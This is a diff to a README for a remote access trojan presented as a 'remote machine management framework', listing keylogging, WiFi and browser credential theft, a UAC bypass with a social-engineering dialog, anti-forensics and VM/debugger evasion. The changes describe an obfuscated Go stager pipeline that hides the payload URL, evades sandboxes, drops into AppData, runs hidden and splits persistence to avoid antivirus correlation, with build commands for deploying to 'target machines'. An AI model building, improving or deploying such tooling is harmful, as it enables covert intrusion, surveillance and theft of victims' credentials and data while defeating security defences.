@@ -44,7 +44,7 @@ A sophisticated, cross-platform remote machine management framework utilizing a 
 - 🔑 **Credential Harvesting**: WiFi passwords, system info, and user data.
 
 ### System Control
-- 🔒 **Persistence**: Registry Run keys + Startup folder VBS stager.
+- 🔒 **Persistence**: HKCU Registry Run key + delayed file copy (split-action to avoid AV correlation).
 - 🛡️ **UAC Bypass**: `ShellExecute` "runas" elevation technique with social engineering dialog.
 - 🧹 **Anti-Forensics**: Clear temp files, PowerShell history, RunMRU, and Recycle Bin.
 - 🕵️ **Anti-Analysis**: VM detection (MAC address, registry, BIOS), debugger checks, and analysis tool detection (Process Hacker, Wireshark, etc.).
@@ -197,28 +197,25 @@ The payload is the executable you deploy to target machines. It connects to your
 
 6.  **Obfuscated Build (Optional)**:
 
-    `obfus.py` is a GUI builder that automates a 6-stage pipeline with no PowerShell dependency:
+    `obfus.py` is a CLI tool that generates a **native Go stager** — no PyInstaller, no PyArmor, no Python runtime in the output. The final binary is a clean compiled Go executable.
 
     | Stage | Description |
     | :--- | :--- |
     | 1 | Compile Go payload (cross-compiled, stripped, windowsgui), XOR encrypt, upload to Litterbox |
     | 2 | Shorten the payload URL |
-    | 3 | Generate obfuscated Python launcher — randomized variable names, split URL chunks, chr() key encoding, junk dead-code, sandbox/VM evasion checks, drops to AppData with a legit service name, executes with CREATE_NO_WINDOW |
-    | 4 | PyArmor obfuscation of the launcher script |
-    | 5 | Generate a Windows version info manifest (random vendor, description, version) |
-    | 6 | PyInstaller onefile build with version info, optional file-size padding |
+    | 3 | Generate a Go stager — URL/key stored as byte arrays (no plaintext strings), sandbox/VM evasion (CPU count, uptime, RAM), drops to a realistic `%APPDATA%` subdir, executes via `CreateProcess` with hidden window |
+    | 4 | Compile the stager with **garble** (obfuscates all symbols + string literals) or standard `go build` as fallback |
 
-    *   **Install Python dependencies**:
+    *   **Install dependencies**:
         ```bash
-        pip install PyQt5 requests pyarmor pyinstaller
+        pip install requests
+        go install mvdan.cc/garble@latest   # recommended for obfuscation
         ```
-    *   **Run the builder**:
+    *   **Run the builder** (from the directory containing `main.go` with your credentials filled in):
         ```bash
         python obfus.py
         ```
-    *   Click **"Select Go File"** and choose your `main.go` (with credentials already filled in).
-    *   Configure options (XOR encryption, PyArmor, sandbox evasion, version manifest, size padding).
-    *   Click **"Build All Stages"** — the final `.exe` will be placed in your current directory.
+    *   The final `.exe` is placed in your current directory. No GUI, no prompts — fully automatic.
 
 ---
 
@@ -252,8 +249,8 @@ The payload accepts the following commands (sent via the "Remote Shell" or Batch
 | `screenshot` | Capture a single screenshot of the desktop. |
 | `keylog_start` | Start the background keylogger process. |
 | `keylog_stop` | Stop the keylogger. |
-| `persist` | Install persistence mechanisms (Registry + Startup). |
-| `unpersist` | Remove persistence mechanisms. |
+| `persist` | Add persistence (HKCU Run key + delayed file copy). |
+| `unpersist` | Remove persistence (registry key + copied file). |
 | `elevate` | Attempt UAC Bypass to gain Administrator privileges. |
 | `cleanup` | Clear temp files, history, and recycle bin. |
 | `browserdb` | Exfiltrate browser databases (Chrome, Edge, Firefox). |
